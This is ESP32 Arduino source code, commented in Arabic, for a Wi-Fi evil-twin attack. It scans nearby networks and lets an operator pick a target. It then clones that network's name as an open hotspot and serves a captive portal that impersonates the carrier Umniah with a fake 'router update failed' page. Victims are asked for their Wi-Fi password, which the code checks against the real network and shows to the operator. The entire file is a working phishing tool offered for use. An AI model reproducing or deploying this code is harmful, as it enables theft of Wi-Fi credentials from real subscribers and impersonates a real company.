#include <Arduino.h>

#include <WiFi.h>          // مكتبة الواي فاي للـ ESP32

#include <WebServer.h>     // مكتبة الـ WebServer للـ ESP32

#include <DNSServer.h>



// تعريف هيكل الشبكة

typedef struct {

  String ssid;

  uint8_t ch;

  uint8_t bssid[6];

} _Network;



const byte DNS_PORT = 53;

DNSServer dnsServer;

WebServer webServer(80); // استخدام WebServer بدلاً من ESP8266WebServer



_Network _networks[16];

_Network _selectedNetwork;

bool hotspot_active = false;

String _correct = "";

String _tryPassword = "";



// إعدادات واجهة المستخدم (Captive Portal)

#define SUBTITLE "مشكلة في الاتصال"

#define TITLE "<span style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</span> فشل في تحديث الجهاز"

#define BODY ".تعذر تحديث نظام الراوتر تلقائياً <br><br> .للرجوع للإصدار السابق والتحديث يدوياً، يرجى إدخال كلمة المرور"



// تنظيف مصفوفة الشبكات

void clearArray() {

  for (int i = 0; i < 16; i++) {

    _networks[i].ssid = "";

  }

}



// تحويل الـ MAC Address لنص

String bytesToStr(const uint8_t* b, uint32_t size) {

  String str;

  for (uint32_t i = 0; i < size; i++) {

    if (b[i] < 0x10) str += "0";

    str += String(b[i], HEX);

    if (i < size - 1) str += ":";

  }

  return str;

}



// بناء الصفحة للهيدر والفوتر (Umniah by Beyon Theme - New 2026)

String header(String t) {

  String a = _selectedNetwork.ssid;

  String CSS =

    "body { color: #1a1a1a; font-family: sans-serif; margin: 0; padding: 0; direction: rtl; background: #ffffff; }"

    "nav { background: #ffffff; padding: 1.5em; text-align: right; border-bottom: 1px solid #f0f0f0; }"

    "nav b { color: #1a1a1a; font-size: 1.5em; font-weight: 900; }"

    ".container { max-width: 480px; margin: 20px auto; padding: 20px; }"

    "h1 { font-size: 24px; font-weight: 900; margin-bottom: 25px; color: #000; }"

    "label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; color: #555; }"

    "input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1px solid #e0e0e0; border-radius: 8px; background: #fafafa; font-size: 16px; box-sizing: border-box; }"

    "input:focus { border-color: #b1002d; outline: none; background: #fff; }"

   

    /* تصميم الزر المتدرج Pill-shaped Gradient حسب الصورة */

    ".btn-gradient { "

    "  width: 100%; padding: 16px; border: none; border-radius: 50px; "

    "  color: white; font-size: 18px; font-weight: bold; cursor: pointer; "

    "  background: linear-gradient(to right, #1d263d 0%, #1d263d 50%, #b1002d 100%); "

    "  box-shadow: 0 4px 12px rgba(0,0,0,0.15); transition: 0.3s; "

    "}"

    ".btn-gradient:hover { opacity: 0.92; transform: scale(0.98); }";



  return "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><style>" + CSS + "</style></head>"

         "<body><nav><b style='color:#e30613;'>Umniah</b> <small style='color:#666;'>by Beyon</small></nav>"

         "<div class='container'><h1>" + t + "</h1>";

}



String footer() {

  return "<div style='text-align: center; font-size: 12px; color: #aaa; margin-top: 40px; border-top: 1px solid #f5f5f5; padding-top: 20px;'>"

         "مركز الدعم الفني: 1333 | Part of Beyon Group &copy; 2026</div>"

         "</div></body></html>";

}



String indexPage() {

  String title = "التحقق من الهوية الرقمية";

  String bodyContent = "عزيزي المشترك، يرجى تأكيد بيانات الوصول لشبكة ( " + _selectedNetwork.ssid + " ) لإتمام عملية التحديث الأمني وتجنب انقطاع الخدمة.";



  return header(title) +

         "<div style='margin-bottom: 30px; line-height: 1.7; color: #444; font-size: 15px;'>" + bodyContent + "</div>"

         "<form action='/' method='post' onsubmit='return validateForm()'>"

         

         "<label>كلمة مرور الواي فاي الحالية *</label>"

         "<input type='password' name='password' id='p1' placeholder='••••••••' required minlength='8'>"

         

         "<label>تأكيد كلمة المرور *</label>"

         "<input type='password' id='p2' placeholder='••••••••' required minlength='8'>"

         

         "<div style='background: #f9f9f9; border: 1px solid #eee; padding: 15px; border-radius: 10px; margin-bottom: 30px; display: flex; align-items: center;'>"

         "<input type='checkbox' style='width: 20px; height: 20px; margin-left: 12px; accent-color: #b1002d;' required> "

         "<span style='font-size: 14px; color: #666;'>أنا لست برنامج روبوت </span>"

         "</div>"

         

         "<input type='submit' class='btn-gradient' value='تأكيد الهوية والمتابعة'>"

         "</form>"

         

         "<script>"

         "function validateForm() {"

         "  var v1 = document.getElementById('p1').value;"

         "  var v2 = document.getElementById('p2').value;"

         "  if (v1 !== v2) { alert('خطأ: كلمات المرور غير متطابقة!'); return false; }"

         "  return true;"

         "}"

         "</script>" + footer();

}



// مسح الشبكات المحيطة

void performScan() {

  int n = WiFi.scanNetworks();

  clearArray();

  if (n >= 0) {

    for (int i = 0; i < n && i < 16; ++i) {

      _networks[i].ssid = WiFi.SSID(i);

      _networks[i].ch = WiFi.channel(i);

      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);

    }

  }

}



void handleResult() {

  if (WiFi.status() != WL_CONNECTED) {

    webServer.send(200, "text/html", "<html><body style='text-align:center;'><h2>كلمة المرور خاطئة</h2><script>setTimeout(function(){window.location.href='/'}, 3000);</script></body></html>");

    _correct = "تم الحصول على الباسورد: " + _tryPassword;

    hotspot_active = false;

    WiFi.softAPdisconnect(true);

    WiFi.softAP("Dr. ARAB", "0123456789");

    webServer.send(200, "text/html", "<html><body><h2>تم التحديث بنجاح</h2></body></html>");

  } else {

    _correct = "تم الحصول على الباسورد: " + _tryPassword;

    hotspot_active = false;

    WiFi.softAPdisconnect(true);

    WiFi.softAP("Dr. ARAB", "0123456789");

    webServer.send(200, "text/html", "<html><body><h2>تم التحديث بنجاح</h2></body></html>");

  }

}



void handleIndex() {

  if (webServer.hasArg("ap")) {

    for (int i = 0; i < 16; i++) {

      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {

        _selectedNetwork = _networks[i];

      }

    }

  }



  if (webServer.hasArg("hotspot")) {

    if (webServer.arg("hotspot") == "start") {

      hotspot_active = true;

      WiFi.softAP(_selectedNetwork.ssid.c_str());

    } else {

      hotspot_active = false;

      WiFi.softAP("Dr. Arab", "0123456789");

    }

    webServer.sendHeader("Location", "/");

    webServer.send(302, "text/plain", "");

    return;

  }



  if (!hotspot_active) {

    String html = "<html><head><meta charset='UTF-8'><style>"

                  "body { font-family: sans-serif; padding: 20px; direction: ltr; }"

                  "table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }"

                  "td, th { padding: 12px; border: 1px solid #ddd; text-align: left; }"

                  "input[type='text'] { padding: 10px; width: 70%; border-radius: 5px; border: 1px solid #ccc; }"

                  ".btn-select { background: #1d263d; color: white; padding: 5px 10px; text-decoration: none; border-radius: 4px; }"

                  ".btn-start { background: #b1002d; color: white; padding: 15px; text-decoration: none; border-radius: 50px; display: inline-block; font-weight: bold; }"

                  "</style></head><body>";



    html += "<h2>Umniah Admin Admin</h2>";

   

    // جدول الشبكات الممسوحة

    html += "<table><tr><th>SSID</th><th>Action</th></tr>";

    for (int i = 0; i < 16; i++) {

        if (_networks[i].ssid == "") break;

        html += "<tr><td>" + _networks[i].ssid + "</td>";

        html += "<td><a class='btn-select' href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>Target This</a></td></tr>";

    }

    html += "</table>";



    // إمكانية الإدخال اليدوي لاسم الشبكة

    html += "<div style='background: #f4f4f4; padding: 15px; border-radius: 8px; margin-bottom: 20px;'>"

            "<h4>Manual SSID Entry (Hidden Networks)</h4>"

            "<form action='/' method='get'>"

            "<input type='text' name='manual_ssid' placeholder='Enter Wi-Fi Name...'>"

            "<input type='submit' value='Set Custom Target' style='padding: 10px; cursor: pointer;'>"

            "</form></div>";



    // معالجة الإدخال اليدوي

    if (webServer.hasArg("manual_ssid")) {

        _selectedNetwork.ssid = webServer.arg("manual_ssid");

        // نضع عنوان BSSID وهمي في حال الإدخال اليدوي

        memset(_selectedNetwork.bssid, 0, 6);

        html += "<p style='color: green;'><b>Target set to: " + _selectedNetwork.ssid + "</b></p>";

    } else {

        html += "<p><b>Current Target: " + _selectedNetwork.ssid + "</b></p>";

    }



    html += "<br><a class='btn-start' href='/?hotspot=start'>START EVIL TWIN ATTACK</a>";

    html += "<br><br><div style='color: red; font-weight: bold;'>" + _correct + "</div>";

    html += "</body></html>";

   

    webServer.send(200, "text/html", html);

} else {

    if (webServer.hasArg("password")) {

      _tryPassword = webServer.arg("password");

      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());

      webServer.send(200, "text/html", "<h2>Verifying...</h2><script>setTimeout(function(){window.location.href='/result'}, 10000);</script>");

    } else {

      webServer.send(200, "text/html", indexPage());

    }

  }

}



void setup() {

  Serial.begin(115200);

  WiFi.mode(WIFI_AP_STA);

  WiFi.softAP("Dr. Arab", "0123456789");

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());



  webServer.on("/", handleIndex);

  webServer.on("/result", handleResult);

  webServer.onNotFound(handleIndex);

  webServer.begin();

  performScan();

}



void loop() {

  dnsServer.processNextRequest();

  webServer.handleClient();

  static unsigned long lastScan = 0;

  if (millis() - lastScan > 30000) {

    performScan();

    lastScan = millis();

  }

}